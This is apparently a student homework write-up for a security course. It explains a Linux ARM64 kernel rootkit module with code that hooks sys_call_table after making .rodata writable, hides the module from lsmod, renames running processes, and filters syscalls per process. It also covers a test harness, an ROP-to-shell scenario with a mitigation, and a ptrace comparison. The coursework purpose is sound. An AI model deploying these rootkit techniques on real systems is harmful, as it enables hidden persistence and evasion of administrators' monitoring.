# SSDI Homework 1 Writeup

## Directory Structure
Our source code consists of the following file:
```
template/
├── child.c
├── Makefile
├── rootkit.c
├── rootkit.h
├── shared_rootkit.h
├── test.c
└── write-up.md
```

We will separately explain different part of the source code, including:
- Module: `rootkit.c, rootkit.h`
- Testbench: `test.c, child.c, shared_rootkit.h`

## Module

>`rootkit.c, rootkit.h`

### `rootkit_init`

In this function, we do the following work:
1. Gets the address of `kallsyms_lookup_name` using `register_kprobe`
```c
if (register_kprobe(&kp) < 0) {
    return -1;
}
kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
unregister_kprobe(&kp);
```

2. Next, uses `kallsyms_lookup_name` to obtain the addresses of non-exposed symbols in kernel.
    - This includes `sys_call_table` and `update_mapping_prot`.

```c
sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");

update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
if (!update_mapping_prot) {
    return -1;
}
```

3. We use newly found `update_mapping_prot` to make the `.rodata` section writable such that we can modify `sys_call_table`.
```c
void mark_rodata_wr(void) {
  unsigned long section_size;
  unsigned long start_rodata =
      (unsigned long)(kallsyms_lookup_name_fn("__start_rodata"));
  unsigned long init_begin =
      (unsigned long)(kallsyms_lookup_name_fn("__init_begin"));
  section_size = init_begin - start_rodata;
  update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
                      PAGE_KERNEL);
}

// in rootkit_init()
mark_rodata_wr();
```
4. Initializes `filter_list` and save our new handlers to `custom_handlers` (Note: We haven't actually hook the syscalls here, we only keep a global reference to the custom handlers so we can insert them to `sys_call_table` once we have a filter for it)
```c
// list of all filters by process
// filter_list = kmalloc(sizeof(struct filter_info), GFP_KERNEL);
filter_list.syscall_nr = -1;
INIT_LIST_HEAD(&filter_list.list);

// hook syscalls
custom_handlers[__NR_read] = my_sys_read;
custom_handlers[__NR_mkdir] = my_sys_mkdir;
```

### `rootkit_ioctl`
This function handles the main operations of our module.
#### `IOCTL_MOD_HIDE`

1. When a user-space program call `IOCTL_MOD_HIDE`, the module removes itself from the kernel module list (output of `lsmod`) by accessing the kernel's linked list structure. We use `module_list` to keep a reference to the original linked list so as to add it back later.

2. Invoking with `IOCTL_MOD_HIDE` again restores the module’s visibility by reinserting it into the list.
```c 
case IOCTL_MOD_HIDE:
    if (!is_hidden) {
      module_list = THIS_MODULE->list.prev;
      list_del(&THIS_MODULE->list);
      is_hidden = 1;
    } else {
      list_add(&THIS_MODULE->list, module_list);
      module_list = NULL;
      is_hidden = 0;
    }
    break;
```



#### `IOCTL_MOD_MASQ`

1. It allocates kernel-space memory for a `masq_proc_req` structure at `req`, which stores masquerading requests received from user space. The user-space request (`usr_req`) is then copied into the kernel-space structure. (The list of entries is copied one by one.)
```c
case IOCTL_MOD_MASQ:
    struct masq_proc_req *req = (struct masq_proc_req *)kmalloc(
        sizeof(struct masq_proc_req), GFP_KERNEL);
    struct masq_proc_req *usr_req = (struct masq_proc_req *)arg;
    req->list = (struct masq_proc *)kmalloc(
        sizeof(struct masq_proc) * usr_req->len, GFP_KERNEL);

    copy_from_user(&req->len, &usr_req->len, sizeof(size_t));
    for (int i = 0; i < req->len; i++) {
      struct masq_proc *entry = &usr_req->list[i];
      copy_from_user(&req->list[i], entry, sizeof(struct masq_proc));
    }
```
2. Iterate through each entry in the list. For valid entries (those `new_name` are shorter than the `orig_name` AND `orig_name` is valid) the module iterates through all running processes using the `for_each_process` macro, If a match is found, it replaces the process name with the masqueraded name. After processing, the internal structure is freed.

```c
for (int i = 0; i < req->len; i++) {
  struct masq_proc *entry = &req->list[i];
  if (strlen(entry->new_name) >= strlen(entry->orig_name)) {
    continue;
  }
  struct task_struct *task;
  for_each_process(task) {
    if (strcmp(task->comm, entry->orig_name) == 0) {
      strncpy(task->comm, entry->new_name, MASQ_LEN);
    }
  }
}

kfree(req->list);
kfree(req);
```

#### `IOCTL_ADD_FILTER`

1. Copy the filter object from user space, we will keep a copy in the module for later matching.
```c
  case IOCTL_ADD_FILTER: {
    // copy from user space
    struct filter_info *filter =
        (struct filter_info *)kmalloc(sizeof(struct filter_info), GFP_KERNEL);
    copy_from_user(filter, (struct filter_info *)arg,
                   sizeof(struct filter_info));
```
2. Validation section
    * Check system call number is within range
    * Set default process name (`= current->comm`) if not set by user

```c
    if (filter->syscall_nr < 0 || filter->syscall_nr >= NR_syscalls) {
      // invalid syscall number
      return -EINVAL;
    }

    if (filter->comm[0] == '\0') {
      strncpy(filter->comm, current->comm, TASK_FILTER_LEN);
      // use current process if name not specified
    }
    struct filter_info *pos;
```
3. Handle System Call References
    * The goal here is to **actually perform the hook** and **keep a reference to original handler** for non-filtered processes.
    * In our implementation, we give **each system call number, each process** a filter object.
    * If the system call (`syscall_nr`) already has filters applied (tracked by `total_references[syscall_nr]` = number of processes filtering this call), the code finds the existing filter for that system call and copies its original handler address (`orig_handler_addr`) into the new filter.
    * If the system call has no filters yet, the original handler address is saved, and the system call is then hooked by updating its corresponding table entry to point to a custom handler.
    * Finally, increment `total_references` and add the filter to the list of all filters.
```c
    if (total_references[filter->syscall_nr] > 0) {
      list_for_each_entry(pos, &filter_list.list, list) {
        if (pos->syscall_nr == filter->syscall_nr) {
          // syscall already has a filter owned by other process
          // copy the reference
          filter->orig_handler_addr = pos->orig_handler_addr;
          break;
        }
      }
    } else {
      // syscall hasn't been filtered yet
      filter->orig_handler_addr =
          (unsigned long)sys_call_table_p[filter->syscall_nr];
      sys_call_table_p[filter->syscall_nr] =
          custom_handlers[filter->syscall_nr];
    }

    total_references[filter->syscall_nr] += 1;
    list_add(&filter->list, &filter_list.list);
    break;
  }
```
#### `IOCTL_REMOVE_FILTER`
Iterate through each entry, when match is found the reference count is decremented.
If the reference count reaches zero, it indicates that this system call is no longer filtered by any process, so the system call table (`sys_call_table_p`) is restored to its original handler address (`orig_handler_addr`). Filter is removed from the `filter_list` using `list_del`, and the memory it used was freed.
```c
case IOCTL_REMOVE_FILTER: {
    struct filter_info *filter = (struct filter_info *)arg;
    struct filter_info *pos;
    list_for_each_entry(pos, &filter_list.list, list) {
      if (strcmp(pos->comm, filter->comm) == 0 &&
          pos->syscall_nr == filter->syscall_nr) {
        total_references[pos->syscall_nr] -= 1;
        if (total_references[pos->syscall_nr] == 0)
          sys_call_table_p[pos->syscall_nr] =
              (syscall_fn_t)pos->orig_handler_addr;
        list_del(&pos->list);
        kfree(pos);
        break;
      }
    }
    break;
```


## Testbench
> `test.c, child.c, shared_rootkit.h`


### `test_hide()`

This function tests the ability to hide and unhide the kernel module:
1. First. open the `/dev/roookit` device, call ioctl with `IOCTL_MOD_HIDE` to hide the module,then run the `lsmod` command to verify the module is hidden,
```c
void test_hide() {
  int fd = open(device, O_RDWR);
  if (fd < 0) {
    perror("open");
    return;
  }
  int ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output

  printf("first call should hide module...\n");
  system("lsmod");
```
2. call the `IOCTL_MOD_HIDE` again to unhide the module and verifies it with `lsmod`.
```c
  ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("second call should unhide module...\n");
  system("lsmod");

  close(fd);
}
```

### `test_masq()`

This function tests the ability to masquerade process names. Debug messages in this part are omitted here for simplicity of the report.

1. First, open the `/dev/roookit` device, create the `masq_proc_req` structure with two process name mappings, and calls ioctl with the `IOCTL_MOD_MASQ` command to apply the masquerading.
```c
void test_masq() {
  int fd = open(device, O_RDWR);
  struct masq_proc_req req;
  req.len = 2;
  req.list = malloc(req.len * sizeof(struct masq_proc));
  strncpy(req.list[0].orig_name, "login", MASQ_LEN);
  strncpy(req.list[0].new_name, "felw", MASQ_LEN); // felwinter
  strncpy(req.list[1].orig_name, "agetty", MASQ_LEN);
  strncpy(req.list[1].new_name, "shax", MASQ_LEN); // lord shaxx

  printf("* masquerading login and agetty processes... before\n");
  system("ps ao pid,comm");

  int ret = ioctl(fd, IOCTL_MOD_MASQ, &req);
  if (ret < 0) {
    perror("ioctl");
    return;
  }
```
2. Uses the `ps` command to verify that the process names have been changed, frees allocated memory and closes the device after testing.
```c
  printf("* call should masquerade processes...\n");
  system("ps ao pid,comm");

  free(req.list);
  close(fd);
}
```
### `test_filter()`

This function tests the filtering of system calls (`read` and `mkdir`).

1. Creates a test file and writes data, then opens the `/dev/rootkit` device and the test file.
```c
int fd = open(test_file, O_CREAT | O_WRONLY, 0777);
write(fd, "hello", 5);
close(fd);

fd = open(device, O_RDWR);
int file_fd = open(test_file, O_RDONLY);
```
2. Sets up a `filter_info` structure to filter the `read` and `mkdir` system calls for a specific process (`proc_name`).
```c
struct filter_info info;
info.syscall_nr = SYS_read;
strncpy(info.comm, proc_name, TASK_FILTER_LEN);
```
3. Calls `ioctl` with `IOCTL_ADD_FILTER` to add the filters for `read` and `mkdir`. Verifies that the `read` and `mkdir` calls are blocked by the filter.
```c
ioctl(fd, IOCTL_ADD_FILTER, &info);
info.syscall_nr = SYS_mkdirat;
ioctl(fd, IOCTL_ADD_FILTER, &info);

lseek(file_fd, 0, SEEK_SET);
read(file_fd, buf, 2);  

mkdir(test_dir_name, 0777);
```
4. Removes the filter using `IOCTL_REMOVE_FILTER` and verifies that the call to `mkdir` works normally since we restored the system call.
```c
ioctl(fd, IOCTL_REMOVE_FILTER, &info);
mkdir(test_dir_name, 0777);
```
5. Tests filtering for another process by forking and executing a child program (`/mnt/child`).
```c
strncpy(info.comm, child_proc_name, TASK_FILTER_LEN);
ioctl(fd, IOCTL_ADD_FILTER, &info);

close(fd);
close(file_fd);

if (fork() == 0) {
 execve(child_exec, NULL, NULL);
 exit(1);
}
```

### `child.c`

This code `child.c` is used to simulate another normal user-space program, testing the ability of the `rootkit` kernel module to intercept system calls for specific process. That is, we want to ensure that filter for other process won't affect this one, and vice versa.

1. In this test, we filtered (from the parent) the syscall `mkdir()` but not the syscall `read()`, so if the syscall `read()` failed it indicate that there was other errors than the rootkit's filtering. 
```c    
int fd = open(filename, O_RDONLY);
if (fd < 0) {
 perror("open");
 return 1;
}

char buf[2];
int n = read(fd, buf, 2);
if (n < 0) {
 perror("child read() failed despite not having filter");
} else {
 printf("child read() succeeded with %d bytes\n", n);
}
```
   
2. Next, we want to test if the filter set by parent works. We attempts to create the directory `/home/hello2` using the `mkdir()` system call. If the rootkit module still intercepted `mkdir()`, it will fail indicating we indeed can set filter for any process. Finally, use `unlink()` to clean up the testing resources.
```c
printf("* child calling mkdir() with filter set by parent\n");
if (mkdir(test_dir_name, 0777) == 0) {
 printf("mkdir() succeeded for child, removing newly created dir %s\n",
        test_dir_name);
 rmdir(test_dir_name);
} else {
 printf("mkdir() failed successfully for child with filter\n");
}
printf("* removing test file at %s\n", filename);
unlink(filename);
```

### `shared_rootkit.h`

Since part of the header that `rootkit.c` uses i.e. `rootkit.h` include definitions that are exclusive to kernelspace, we created a separate header for the testbench, most notably the removal of the following definition:
```
#define PAGE_KERNEL __pgprot(PROT_NORMAL)
```

An additional definition for `list_head`, are also added to avoid having to include kernel header for the testbench.
```
struct list_head {
  struct list_head *next, *prev;
};
```

## Questions
### 1. ROP

An underlying issue for most, rather coarse, syscall filtering approaches are that they either allow or deny with no in-between. Surely the filter has the capability to block malicious actors from accessing filtered syscalls directly.

#### Attack
Yet, legitimate processes themselves may still require some important syscalls in order to work and pose potential danger. However, it may be possible for an attacker to find opportunities for control flow hijacking within the binary. Consider the following example:

:::info
Assumptions
1. An application (say, a web server) cannot work without the system call `execve`, but `execve` is normally used to spawn worker processes.
2. The application is applying our system call filtering approach to block a list of system calls, excluding `execve`. (That is, it filters only by syscall number and process name)
3. An attacker managed to find an ROP chain with the last gadget ending as `syscall` and they can control the system call's first parameter (register `X0`)
:::

With the assumptions in place, we may consider an adversary that deliberately use the ROP chain with deliberately designed manipulation of registers that call `execve("/bin/sh", ...)`, which spawns a shell for them. If the process was ran by a priviledged user, this causes a priviledge escalation. 

#### Reason & Mitigation

The root of the problem is due to **our filter being over coarse-grained, such that it has no control over the possible parameters being passed in**. Thus, a mitigation would be to design a more fine-grained solution. For example, we may **allow users to assign accepted values for each parameter**, like only allowing `./worker` for the `pathname` parameter in `execve`, such that when `execve("bin/sh" ...)` is issued, it shall be filtered.


### 2. Comparing with `ptrace` approach

A typical approach of filtering using `ptrace` involves using `PTRACE_SYSCALL` to request a trace on other processes, once requested, the tracer shall call `waitpid()` for notification of stopped tracee, until then the tracer can perform actions.

`ptrace` works by setting a flag on tracee's `task_struct` which is then checked by architecture-specific system call entry to determine whether to call [`ptrace_report_syscall`](https://elixir.bootlin.com/linux/v6.1/source/include/linux/ptrace.h#L412) and notify the tracer.


The filtering is usually done after first notification where the tracer can verify the system call number using `PTRACE_PEEKUSER` and perform the filtering, which is usually done by `PTRACE_POKEUSER` to modify the return value or invalidates the call by changing arguments.

In terms of advantages / Disadvantages:
- `ptrace` approach allows filtering with PID, which allows more fine-grained filter compared to our process name (`task_struct->comm`) approach.
- `ptrace` approach allow us to filter without ever modifying `sys_call_table`, as it still follows the same control flow as a normal system call would go.
- Our approach is simpler to use as it doesn't require the initial setup of `ptrace` on tracer/tracee, `wait()` on the tracer, and manually modification of the tracee's memory to intervene with the call.
- Our approach probably has less overhead as well. We see `ptrace` actually involves frequent context switches between the tracee's kernel space and the tracer's user space, while our module performs both the checking and filtering within kernel space.

## References
* [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
* [Linux ARM64 hook系统调用原创](https://blog.csdn.net/weixin_45030965/article/details/129203081)
* [Modifying System Call Arguments with ptrace](https://www.alfonsobeato.net/c/modifying-system-call-arguments-with-ptrace/)
* [strace原理、ptrace PTRACE_SYSCALL 调用跟踪](https://blog.csdn.net/weixin_42544902/article/details/135449029)
* [How does ptrace work in Linux?](https://stackoverflow.com/questions/23928530/how-does-ptrace-work-in-linux)
* [seccomp internals](https://www.armosec.io/blog/seccomp-internals-part-1/)
* [A64 Procedure call standard](https://developer.arm.com/documentation/102374/0102/Procedure-Call-Standard)
* [errno.h](https://elixir.bootlin.com/linux/v6.1/source/include/uapi/asm-generic/errno.h)
* [why is the open() syscall supported on some Linux systems and not others?](https://elixir.bootlin.com/linux/v6.1/source/include/uapi/asm-generic/errno.h)
* [Export kernel module header to user space](https://stackoverflow.com/questions/6124238/export-kernel-module-headers-to-userspace)
* Professor and TA
